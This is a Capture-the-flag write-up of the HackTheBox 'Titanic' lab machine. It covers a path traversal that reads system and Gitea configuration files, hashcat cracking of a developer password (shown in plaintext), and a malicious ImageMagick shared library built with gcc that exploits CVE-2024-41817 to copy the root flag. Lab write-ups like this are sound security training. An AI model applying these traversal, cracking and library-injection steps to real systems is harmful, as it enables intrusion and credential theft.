---
title: HackTheBox - Titanic
authors: Samarth
date: 2025-02-15 14:00:00 +0530
categories: [HackTheBox, Machines]
tags: [Linux, Apache, Path Traversal, LFI, ImageMagick, CVE-2022-44268]
math: true
mermaid: true
---

![Titanic - HTB](/assets/images/writeups/Titanic-HTB/banner.png)

## TL;DR

This writeup is based on the [__Titanic__](https://app.hackthebox.com/machines/Titanic){:target="_blank"} machine, an easy-rated Linux box on Hack The Box. After scanning the target, I found that ports 22 (SSH) and 80 (Apache) were open. The website redirected to `titanic.htb`, which I added to `/etc/hosts`. While interacting with the booking form, I discovered a path traversal vulnerability in the `/download` endpoint, allowing me to read sensitive files, including `/etc/passwd`. Further enumeration revealed a `Gitea` instance (`dev.titanic.htb`), where I extracted the `app.ini` configuration file, leading to a SQLite database with user password hashes. Using `gitea2hashcat`, I cracked the developer's password and gained SSH access. For privilege escalation, I found an `ImageMagick` process running as root. Exploiting [__`CVE-2024-41817`__](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8){:target="_blank"}, I injected a malicious shared library to retrieve the root flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 22 and 80, corresponding to OpenSSH, and Apache 2.4.52. Here are the results from the Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.55 -oN scan/normal.scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-25 20:43 IST
Nmap scan report for 10.10.11.55
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH and HTTP services were detected. Next, I proceeded with HTTP enumeration.

## Enumeration

The Nmap scan revealed that the IP address was linked to the domain `titanic.htb`. Therefore, I add this domain to the `"/etc/hosts"` file.

![Titanic Website](/assets/images/writeups/Titanic-HTB/1.png)

A form is available on the website under `Book Now`. I filled in the form with sample details.

![Book Now Form](/assets/images/writeups/Titanic-HTB/3.png)

Next, I submitted the form and captured the web request using `Burp Suite`.

![Burp Request](/assets/images/writeups/Titanic-HTB/4.png)

The request was sent to the `/book` directory. Upon submission, it was redirected to the `/download` folder with a `ticket` parameter, where the response contained a `.json` file.

Let's follow the redirection.

![/download redirection](/assets/images/writeups/Titanic-HTB/5.png)

Upon analyzing the response, I discovered that the `ticket` parameter accepts input as a file and returns the status of whether the ticket has been created. In the response, I have found that the website is hosted on `Werkzeug/3.0.3` webserver and Werkzeug is a WSGI utility library used for building web applications in Python, often used with Flask. The application is running on `Python/3.10.12`.

## Exploitation

Analyzing the `ticket` parameter on `/download` hinted at a potential `Path Traversal` vulnerability. So, let's try to access `/etc/passwd`.

![Path Traversal](/assets/images/writeups/Titanic-HTB/6.png)

I successfully accessed `/etc/passwd`, confirming the existence of a Path Traversal vulnerability in the `ticket` parameter.

I found a user with the home directory `/home/developer`, where I could access the user flag.

![User Flag](/assets/images/writeups/Titanic-HTB/7.png)

Next, I needed to find a way to gain shell access as the user. Let's check `/etc/hosts` to see if any subdomain is being used.

![/etc/hosts](/assets/images/writeups/Titanic-HTB/8.png)

I have found one subdomain `dev.titanic.htb` which checking the hosts file. Let's add it in our hosts file and browse it.

![Gitea: Git with a cup of tea](/assets/images/writeups/Titanic-HTB/9.png)

`Gitea: Git with a cup of tea` git service is running. While browsing on the website, I came across two repositories.

![Repositories](/assets/images/writeups/Titanic-HTB/10.png)

While browsing `developer/docker-config` repository, I have found path to the gitea directory in `docker-compose.yml`.

![Gitea directory path](/assets/images/writeups/Titanic-HTB/11.png)

In the second repository `flask-app`, I have found 2 users as `Rose DeWitt Bukater` and `Jack Dawson`.

![User found via tickets](/assets/images/writeups/Titanic-HTB/16.png)

While researching about `Gitea` on Google, I found it's the custom configuration file is stored in [__`/gitea/conf/app.ini`__](https://docs.gitea.com/next/administration/config-cheat-sheet){:target="_blank"}.

By clubbing the path I have found in `docker-compose.yml` and the custom configuration, file configuration file path I have made is `/home/developer/gitea/data/gitea/conf/app.ini`. Let's use this path and see if I can able to access the configuration file.

![Database file path](/assets/images/writeups/Titanic-HTB/12.png)

I successfully accessed the custom configuration file, which contained the database file path. Let's download database file.

![Database file](/assets/images/writeups/Titanic-HTB/13.png)

Next, I opened the database file in [__`DB Browser`__](https://sqlitebrowser.org/){:target="_blank"}.

![DB Browser](/assets/images/writeups/Titanic-HTB/14.png)

While browsing the database file, I found password hashes for the `administrator` and `developer` users.

![User's hashes](/assets/images/writeups/Titanic-HTB/15.png)

The password hashing algorithm used is `pbkdf2$50000$50`.

`PBKDF2` is a key derivation function in cryptography, originally defined in version 2.0 of the PKCS#5 standard in RFC2898. It’s used for reducing vulnerabilities to brute force attacks.

I tried Googling a bit and I have found there is a tool called `gitea2hashcat`.

[__`gitea2hashcat`__](https://github.com/F4dee3/gitea2hashcat){:target="_blank"} is a tool used to extract password hashes from a Gitea database and convert them into a format that can be cracked using Hashcat.

I will be using the tool to convert it into hashcat format.

```bash
./giteaCracked.sh -d "_home_developer_gitea_data_gitea_gitea.db" -o "gitea.hashes"
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcxxxxxxxxxxxxxxxxxxxxxx
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/dxxxxxxxxxxxxxxxxxxxxxx
```

The format above is `user:sha256:<iteration>:<base64-salt>:<base64-password-hash>`

Now, I can use hashcat to crack the hashes but the hash is started with username so  will be giving `--user` to start with `PBKDF2`.

```bash
hashcat gitea.hash /usr/share/wordlists/rockyou.txt --user

hashcat (v6.2.6) starting in autodetect mode

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF
...[snip]...
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

```bash
hashcat gitea.hash /usr/share/wordlists/rockyou.txt --user --show

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

I successfully cracked the password for `developer` user.

If you want to understand the `cracking gitea hash` please checkout [__https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash__](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash){:target="_blank"}.

![Developer shell](/assets/images/writeups/Titanic-HTB/17.png)

## Post Exploitation

I checked the current user's privileges using `sudo -l`, but `developer` does not belong to the sudoers group.

I listed all running processes using `ps aux` to gather more information.

![ps aux](/assets/images/writeups/Titanic-HTB/18.png)

Since the Flask application is running, I checked the `/opt` directory for anything interesting.

![/opt/scripts](/assets/images/writeups/Titanic-HTB/19.png)

I found a bash script in `/opt/scripts` so I examined its content.

![ImageMagick](/assets/images/writeups/Titanic-HTB/20.png)

I have found that the `ImageMagick` is installed on the machine.

`ImageMagick` is a free, open-source software suite, used for editing and manipulating digital images. It can be used to create, edit, compose, or convert bitmap images, and supports a wide range of file formats, including JPEG, PNG, GIF, TIFF, and Ultra HDR.

I checked the version of `ImageMagick` installed on the machine.

![ImageMagick Version](/assets/images/writeups/Titanic-HTB/21.png)

I found `ImageMagick 7.1.1-35` running on the machine. I will be looking CVEs against this existing version to see if it is vulnerable or not.

I have found `CVE-2024-41817` vulnerable to exact version of `ImageMagick`.

**CVE-2024-41817** - ImageMagick is a free and open-source software suite, used for editing and manipulating digital images. The `AppImage` version `ImageMagick` might use an empty path when setting `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` environment variables while executing, which might lead to arbitrary code execution by loading malicious configuration files or shared libraries in the current working directory while executing `ImageMagick`.

I found a PoC exploit for this CVE here - [__https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8__](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8){:target="_blank"}.

![PoC](/assets/images/writeups/Titanic-HTB/22.png)

From identify_images.sh we know that the directory we need is /opt/app/static/assets/images/. To retrieve `root.txt`, I created a shared library that copies `/root/root.txt` and modifies its permissions.

```c++
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt");
    exit(0);
}
EOF
```

After few seconds, `root.txt` will appear in the directory.

![Root Flag](/assets/images/writeups/Titanic-HTB/23.png)


![Machine Pwned](/assets/images/writeups/Titanic-HTB/Pwned.png)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.